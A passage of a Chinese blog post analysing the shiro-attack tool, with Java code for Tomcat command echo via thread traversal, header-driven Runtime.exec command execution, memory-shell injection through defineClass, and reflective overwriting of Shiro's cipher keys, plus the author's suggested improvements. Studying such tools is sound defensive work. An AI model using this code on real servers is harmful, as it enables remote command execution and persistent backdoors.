<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var5.length; ++var6) &#123;</span><br><span class="line">           Thread var7 = var5[var6];</span><br><span class="line">           <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">               String var3 = var7.getName();</span><br><span class="line">               <span class="keyword">if</span> (!var3.contains(<span class="string">&quot;exec&quot;</span>) &amp;&amp; var3.contains(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                   Object var1 = getFV(var7, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">           ...</span><br></pre></td></tr></table></figure>

<p>​    我当前的环境是<code>springboot</code>中内置的<code>tomcat</code>,但是打开自己下载的<code>tomcat</code>发现其实创建的<code>ClientPoller</code>不一定只有一个,查阅资料默认配置下<code>ClientPoller</code>的个数是CPU的核数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pollers = <span class="keyword">new</span> Poller[getPollerThreadCount()];</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;pollers.length; i++) &#123;</span><br><span class="line">     pollers[i] = <span class="keyword">new</span> Poller();</span><br><span class="line">     Thread pollerThread = <span class="keyword">new</span> Thread(pollers[i], getName() + <span class="string">&quot;-ClientPoller-&quot;</span>+i);</span><br><span class="line">     pollerThread.setPriority(threadPriority);</span><br><span class="line">     pollerThread.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">     pollerThread.start();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>​    所以我认为这个for循环的这么写应该更合理一些</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), <span class="string">&quot;threads&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> var6 = <span class="number">0</span>; var6 &lt; var5.length; ++var6) &#123;</span><br><span class="line">           Thread var7 = var5[var6];</span><br><span class="line">           <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">               String var3 = var7.getName();</span><br><span class="line">               <span class="keyword">if</span> (var3.contains(<span class="string">&quot;ClientPoller&quot;</span>)) &#123;</span><br><span class="line">                   Object var1 = getFV(var7, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">           ...</span><br></pre></td></tr></table></figure>

<p>​    或者通过<code>Acceptor</code>来获取，<code>Acceptor</code>主要用来接收连接，默认为一个。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (var3.contains(<span class="string">&quot;Acceptor&quot;</span>)) &#123;</span><br><span class="line">                    Object var1 = getFV(var7, <span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (var1 <span class="keyword">instanceof</span> Runnable) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            var1 = getFV(getFV(getFV(var1, <span class="string">&quot;endpoint&quot;</span>), <span class="string">&quot;handler&quot;</span>), <span class="string">&quot;global&quot;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h4><p>​    通过<code>RequestContextHolder</code>的静态方法获取<code>RequestAttributes</code>对象，在通过<code>getResponse</code>获取Response对象。</p>
<h4 id="AllEcho"><a href="#AllEcho" class="headerlink" title="AllEcho"></a>AllEcho</h4><p>​    这种方式基本思路是遍历当前线程保存的所有非静态属性，直到找到<code>Request</code>或<code>Response</code>对象。默认遍历的深度是50层。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Find</span><span class="params">(Object start,<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth &gt; max_depth||(req!=<span class="keyword">null</span>&amp;&amp;resp!=<span class="keyword">null</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//开始时start传入的是Thread.currentThread()对象</span></span><br><span class="line">        Class n=start.getClass();</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">           <span class="comment">//获取当前对象中保存的属性</span></span><br><span class="line">            <span class="keyword">for</span> (Field declaredField : n.getDeclaredFields()) &#123;</span><br><span class="line">                declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object obj = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">//判断属性是否为static，是则跳过</span></span><br><span class="line">                    <span class="keyword">if</span>(Modifier.isStatic(declaredField.getModifiers()))&#123;</span><br><span class="line">                        <span class="comment">//静态字段</span></span><br><span class="line">                        <span class="comment">//obj = declaredField.get(null);</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        obj = declaredField.get(start);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(obj != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="comment">//不是数组直接调用proc方法检查obj中是否为request或response对象</span></span><br><span class="line">                        <span class="keyword">if</span>(!obj.getClass().isArray())&#123;</span><br><span class="line">                            proc(obj,depth);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                         <span class="comment">//是数组则判断持有的对象是否为基本类型，不是基本类型才会遍历数组并判断是否为request或response对象</span></span><br><span class="line">                            <span class="keyword">if</span>(!obj.getClass().getComponentType().isPrimitive()) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (Object o : (Object[]) obj) &#123;</span><br><span class="line">                                    proc(o, depth);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">while</span>(</span><br><span class="line">            <span class="comment">//获取父类并遍历属性</span></span><br><span class="line">                (n = n.getSuperclass())!=<span class="keyword">null</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>​    判断当前对象是否持有request和response类型，如果是则执行命令并写入Response。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">proc</span><span class="params">(Object obj,<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">    <span class="comment">//如果遍历层数已经是最大层数则返回</span></span><br><span class="line">       <span class="keyword">if</span>(depth &gt; max_depth||(req!=<span class="keyword">null</span>&amp;&amp;resp!=<span class="keyword">null</span>))&#123;</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="comment">// 如果该类型是java.lang包下的并且已经处理过了则跳过</span></span><br><span class="line">       <span class="keyword">if</span>(!isSkiped(obj))&#123;</span><br><span class="line">           <span class="comment">//判断obj类型是否为HttpServletRequest.class的子类</span></span><br><span class="line">           <span class="keyword">if</span>(req==<span class="keyword">null</span>&amp;&amp;ReqC.isAssignableFrom(obj.getClass()))&#123;</span><br><span class="line">               req = (HttpServletRequest)obj;</span><br><span class="line">               <span class="keyword">if</span>(req.getHeader(<span class="string">&quot;cmd&quot;</span>)==<span class="keyword">null</span>)</span><br><span class="line">                   req=<span class="keyword">null</span>;</span><br><span class="line">		<span class="comment">//判断obj类型是否为HttpServletResponse.class的子类</span></span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span>(resp==<span class="keyword">null</span>&amp;&amp;RespC.isAssignableFrom(obj.getClass()))&#123;</span><br><span class="line">               resp = (HttpServletResponse) obj;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//如果获取到request和response对象，则执行命令并写入</span></span><br><span class="line">           <span class="keyword">if</span>(req!=<span class="keyword">null</span>&amp;&amp;resp!=<span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   PrintWriter os = resp.getWriter();</span><br><span class="line">                   Process proc = Runtime.getRuntime().exec(req.getHeader(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">                   proc.waitFor();</span><br><span class="line">                   Scanner scanner = <span class="keyword">new</span> Scanner(proc.getInputStream());</span><br><span class="line">                   scanner.useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                   os.print(<span class="string">&quot;Test by fnmsd &quot;</span>+scanner.next());</span><br><span class="line">                   os.flush();</span><br><span class="line">               &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//继续遍历</span></span><br><span class="line">           Find(obj,depth+<span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>​    由于注入内存马的代码量比较大，直接将数据带到请求头中会导致请求头过大而注入失败，所以这里作者将实际内存马的内容和注入的代码分开，post的参数dy中才是真正注入内存马的代码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">injectMem</span><span class="params">(String memShellType, String shellPass, String shellPath)</span> </span>&#123;</span><br><span class="line"><span class="comment">//获取rememberMe的内容，这里传入的回显类是InjectMemTool，也就是InjectMemTool的字节码将会被放到TemplateImpl-&gt;_bytecodes属性中</span></span><br><span class="line">    String injectRememberMe = <span class="keyword">this</span>.GadgetPayload(gadget, <span class="string">&quot;InjectMemTool&quot;</span>, realShiroKey);</span><br><span class="line">    <span class="keyword">if</span> (injectRememberMe != <span class="keyword">null</span>) &#123;</span><br><span class="line">       	<span class="comment">//请求头中传入shell密码和路径。</span></span><br><span class="line">        HashMap&lt;String, String&gt; header = <span class="keyword">new</span> HashMap();</span><br><span class="line">        header.put(<span class="string">&quot;Cookie&quot;</span>, injectRememberMe);</span><br><span class="line">        header.put(<span class="string">&quot;p&quot;</span>, shellPass);</span><br><span class="line">        header.put(<span class="string">&quot;path&quot;</span>, shellPath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//根据内存马的类型得到对应的字节码，base64后传给dyv参数。</span></span><br><span class="line">            String b64Bytecode = MemBytes.getBytes(memShellType);</span><br><span class="line">            String postString = <span class="string">&quot;dy=&quot;</span> + b64Bytecode;</span><br><span class="line">            String result = <span class="keyword">this</span>.bodyHttpRequest(header, postString);</span><br><span class="line">            <span class="comment">//返回Success则代表注入成功</span></span><br><span class="line">            <span class="keyword">if</span> (result.contains(<span class="string">&quot;-&gt;|Success|&lt;-&quot;</span>)) &#123;</span><br><span class="line">                String httpAddress = Utils.UrlToDomain(<span class="keyword">this</span>.url);</span><br><span class="line">                <span class="keyword">this</span>.mainController.InjOutputArea.appendText(Utils.log(memShellType + <span class="string">&quot;  注入成功!&quot;</span>));</span><br><span class="line">                <span class="keyword">this</span>.mainController.InjOutputArea.appendText(Utils.log(<span class="string">&quot;路径：&quot;</span> + httpAddress + shellPath));</span><br><span class="line">                <span class="keyword">if</span> (!memShellType.equals(<span class="string">&quot;reGeorg[Servlet]&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.mainController.InjOutputArea.appendText(Utils.log(<span class="string">&quot;密码：&quot;</span> + shellPass));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (result.contains(<span class="string">&quot;-&gt;|&quot;</span>) &amp;&amp; result.contains(<span class="string">&quot;|&lt;-&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.mainController.InjOutputArea.appendText(Utils.log(result));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>.mainController.InjOutputArea.appendText(Utils.log(<span class="string">&quot;注入失败,请更换注入类型或者更换新路径&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.mainController.InjOutputArea.appendText(Utils.log(<span class="string">&quot;-------------------------------------------------&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    下面我们看下<code>InjectMemTool</code>的内容，下面是<code>InjectMemTool</code>构造方法的内容，前面内容和<code>Tomcat</code>回显的内容相同，从线程数组中获取request和response对象，我没有在代码中给出来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  o = getFV(p, \<span class="string">&quot;req\&quot;);</span></span><br><span class="line"><span class="string">  resp = o.getClass().getMethod(\&quot;getResponse\&quot;, new Class[0]).invoke(o, new Object[0]);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                      Object conreq = o.getClass().getMethod(\&quot;getNote\&quot;, new Class[]&#123;int.class&#125;).invoke(o, new Object[]&#123;new Integer(1)&#125;);</span></span><br><span class="line"><span class="string">//获取dy参数保存的内容</span></span><br><span class="line"><span class="string">                      dy = (String) conreq.getClass().getMethod(\&quot;getParameter\&quot;, new Class[]&#123;String.class&#125;).invoke(conreq, new Object[]&#123;new String(\&quot;dy\&quot;)&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                      if (dy != null &amp;&amp; !dy.isEmpty()) &#123;</span></span><br><span class="line"><span class="string">                          //base64解码</span></span><br><span class="line"><span class="string">                          byte[] bytecodes = org.apache.shiro.codec.Base64.decode(dy);</span></span><br><span class="line"><span class="string">					//获取defineClass方法</span></span><br><span class="line"><span class="string">                          java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\&quot;defineClass\&quot;, new Class[]&#123;byte[].class, int.class, int.class&#125;);</span></span><br><span class="line"><span class="string">                          defineClassMethod.setAccessible(true);</span></span><br><span class="line"><span class="string">		//调用defineClass加载dy中保存的字节码</span></span><br><span class="line"><span class="string">                          Class cc = (Class) defineClassMethod.invoke(this.getClass().getClassLoader(), new Object[]&#123;bytecodes, new Integer(0), new Integer(bytecodes.length)&#125;);</span></span><br><span class="line"><span class="string">		//实例化对象并调用equals方法</span></span><br><span class="line"><span class="string">                          cc.newInstance().equals(conreq);</span></span><br><span class="line"><span class="string">                          done = true;</span></span><br><span class="line"><span class="string">                      &#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="修改shiro-key"><a href="#修改shiro-key" class="headerlink" title="修改shiro key"></a>修改shiro key</h3><p>​    <code>SummerSec</code>师傅实现了修改shiro key的功能了，有了这个功能渗透就真的是比手速了，或许以后渗透还需到了解如何动态修补各种漏洞，哈哈，开个玩笑。</p>
<p>​    修改Shiro key的思路是找到<code>ShiroFilterFactoryBean</code>对象，从这个对象中可以拿到<code>remeberMeMamanger</code>，这个对象中可以获取加密和解密的密钥。</p>
<p><img src="/2021/12/25/shiro-attack%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/image-20211230212055593.png" alt="image-20211230212055593"></p>
<p>​    在<code>filterConfigs</code>中保存了<code>ShiroFilterFactoryBean</code>实例，因此可以从中获取key。</p>
<p><img src="/2021/12/25/shiro-attack%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/image-20211230220509382.png" alt="image-20211230220509382"></p>
<p>​    <code>SummerSec</code>师傅的实现代码如下,前面获取<code>filterConfigs</code>的代码就不分析了，和注册Filter内存马的时候一致。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">org.apache.tomcat.util.threads.TaskThread thread = (org.apache.tomcat.util.threads.TaskThread) Thread.currentThread();</span><br><span class="line">       java.lang.reflect.Field field = thread.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">       field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object obj = field.get(thread);</span><br><span class="line">       field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">       field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       obj = field.get(obj);</span><br><span class="line">       field = obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">       field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       obj = field.get(obj);</span><br><span class="line">	<span class="comment">//获取filterConfigs属性</span></span><br><span class="line">       field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">       field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       obj = field.get(obj);</span><br><span class="line">       java.util.HashMap&lt;String, Object&gt; objMap = (java.util.HashMap&lt;String, Object&gt;) obj;</span><br><span class="line">	<span class="comment">//遍历filterConfigs</span></span><br><span class="line">       java.util.Iterator&lt;Map.Entry&lt;String, Object&gt;&gt; entries = objMap.entrySet().iterator();</span><br><span class="line">       <span class="keyword">while</span> (entries.hasNext()) &#123;</span><br><span class="line">           Map.Entry&lt;String, Object&gt; entry = entries.next();</span><br><span class="line">           <span class="comment">//检测key是否为shiroFilterFactoryBean</span></span><br><span class="line">           <span class="keyword">if</span> (entry.getKey().equals(<span class="string">&quot;shiroFilterFactoryBean&quot;</span>)) &#123;</span><br><span class="line">               obj = entry.getValue();</span><br><span class="line">               field = obj.getClass().getDeclaredField(<span class="string">&quot;filter&quot;</span>);</span><br><span class="line">               field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">               obj = field.get(obj);</span><br><span class="line">               field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;securityManager&quot;</span>);</span><br><span class="line">               field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">               obj = field.get(obj);</span><br><span class="line">               field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;rememberMeManager&quot;</span>);</span><br><span class="line">               field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">               obj = field.get(obj);</span><br><span class="line">               <span class="comment">//通过反射调用setEncryptionCipherKey修改加密key</span></span><br><span class="line">               java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setEncryptionCipherKey&quot;</span>, <span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[].class&#125;);</span><br><span class="line">               <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.base64Decode(<span class="string">&quot;FcoRsBKe9XB3zOHbxTG0Lw==&quot;</span>);</span><br><span class="line">               setEncryptionCipherKey.invoke(obj, <span class="keyword">new</span> Object[]&#123;bytes&#125;);</span><br><span class="line">                  <span class="comment">//通过反射调用setDecryptionCipherKey修改解密key</span></span><br><span class="line">               java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setDecryptionCipherKey&quot;</span>, <span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[].class&#125;);</span><br><span class="line">               setDecryptionCipherKey.invoke(obj, <span class="keyword">new</span> Object[]&#123;bytes&#125;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    但是这种方式有一个问题，如果我设置<code>ShiroFilterFactoryBean</code>时设置了name属性，那么遍历<code>filterConfigs</code>是，保存<code>ShiroFilterFactoryBean</code>的Filter的名称就会是<code>shiroFilter</code>，所以会修改失败。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean(</span></span><br><span class="line"><span class="meta">           name = &#123;&quot;shiroFilter&quot;&#125;</span></span><br><span class="line"><span class="meta">   )</span></span><br><span class="line">   <span class="function">ShiroFilterFactoryBean <span class="title">shiroFilterFactoryBean</span><span class="params">(SecurityManager securityManager)</span> </span>&#123;</span><br><span class="line">       ShiroFilterFactoryBean bean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line">       bean.setSecurityManager(securityManager);</span><br><span class="line">       bean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">       bean.setUnauthorizedUrl(<span class="string">&quot;/unauth&quot;</span>);</span><br><span class="line">       Map&lt;String, String&gt; map = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line">       map.put(<span class="string">&quot;/doLogin&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">       map.put(<span class="string">&quot;/index/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">       bean.setFilterChainDefinitionMap(map);</span><br><span class="line">       <span class="keyword">return</span> bean;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/25/shiro-attack%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/image-20211230221554446.png" alt="image-20211230221554446"></p>
<p>​    但是无论有没有配置name属性，filter属性中保存的filter的类名一定是<code>ShiroFilterFactoryBean</code>,所以我们可以先获取filter属性，然后查看类名是否为<code>ShiroFilterFactoryBean</code>，如果是则通过反射调用修改key。</p>
<p><img src="/2021/12/25/shiro-attack%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/image-20211230222851227.png" alt="image-20211230222851227"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> (entries.hasNext()) &#123;</span><br><span class="line">    Map.Entry&lt;String, Object&gt; entry = entries.next();</span><br><span class="line">    obj = entry.getValue();</span><br><span class="line">    <span class="comment">//先获取filter属性</span></span><br><span class="line">    field = obj.getClass().getDeclaredField(<span class="string">&quot;filter&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    obj = field.get(obj);</span><br><span class="line">    <span class="comment">//判断保存的类型是否为ShiroFilterFactoryBean</span></span><br><span class="line">    <span class="keyword">if</span> (obj.getClass().toString().contains(<span class="string">&quot;ShiroFilterFactoryBean&quot;</span>)) &#123;</span><br><span class="line">        field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;securityManager&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        obj = field.get(obj);</span><br><span class="line">        field = obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;rememberMeManager&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        obj = field.get(obj);</span><br><span class="line">        java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setEncryptionCipherKey&quot;</span>, <span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[].class&#125;);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.base64Decode(<span class="string">&quot;FcoRsBKe9XB3zOHbxTG0Lw==&quot;</span>);</span><br><span class="line">        setEncryptionCipherKey.invoke(obj, <span class="keyword">new</span> Object[]&#123;bytes&#125;);</span><br><span class="line">        java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod(<span class="string">&quot;setDecryptionCipherKey&quot;</span>, <span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[].class&#125;);</span><br><span class="line">        setDecryptionCipherKey.invoke(obj, <span class="keyword">new</span> Object[]&#123;bytes&#125;);</span><br><span class="line">    &#125;</span><br><span 